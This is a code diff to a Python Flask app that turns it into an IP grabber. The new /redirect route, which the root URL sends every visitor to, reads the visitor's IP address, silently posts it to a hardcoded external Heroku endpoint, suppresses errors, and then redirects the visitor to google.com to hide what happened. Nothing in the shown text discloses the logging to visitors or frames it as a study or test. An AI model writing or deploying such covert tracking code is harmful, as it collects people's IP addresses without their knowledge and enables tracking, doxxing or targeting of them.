@@ -1,29 +1,46 @@
 import os
-from flask import Flask, request
+import requests
+from flask import Flask, request, redirect
 
 app = Flask(__name__)
 
-@app.route('/log_ip', methods=['POST'])
-def log_ip():
+# Root route to redirect to /redirect
+@app.route('/')
+def home():
+    return redirect('/redirect')
+
+@app.route('/redirect', methods=['GET'])
+def send_ip_and_redirect():
+    # Get the real client IP address from the X-Forwarded-For header.
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+    # Send the IP address to another server
+    target_server_url = "https://powerful-castle-33891-b06c61e5b944.herokuapp.com/log_ip"  # Replace with your target server URL
+    payload = {"ip": client_ip}
+
     try:
-        # Extract the IP address from the POST request payload
-        data = request.get_json()
-        client_ip = data.get("ip")
-
-        if client_ip:
-            # Log the IP address to the console
-            print(f"Received IP Address: {client_ip}")
-
-            # Optional: Write the IP address to a file
-            with open("received_ips.txt", "a") as file:
-                file.write(f"{client_ip}\n")
-
-            return {"status": "success", "message": "IP logged successfully"}, 200
-        else:
-            return {"status": "error", "message": "No IP provided"}, 400
+        # Send the IP as a POST request
+        requests.post(target_server_url, json=payload)
     except Exception as e:
-        return {"status": "error", "message": str(e)}, 500
+        pass  # Silently handle exceptions without logging
 
+    # Redirect the user to google.com
+    target_url = "https://google.com"
+    return redirect(target_url)
+
+# Test route to check external connectivity
+@app.route('/test-connection')
+def test_connection():
+    try:
+        # Try to make a GET request to an external URL (Google in this case)
+        response = requests.get("https://google.com")
+        
+        # Return the status if successful
+        return f"Successfully reached Google! Status: {response.status_code}"
+    except requests.exceptions.RequestException as e:
+        # If there was an issue with the request, return an error message
+        return f"Failed to reach Google. Error: {str(e)}"
+
+# Run the app
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if PORT is not set
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=5000)
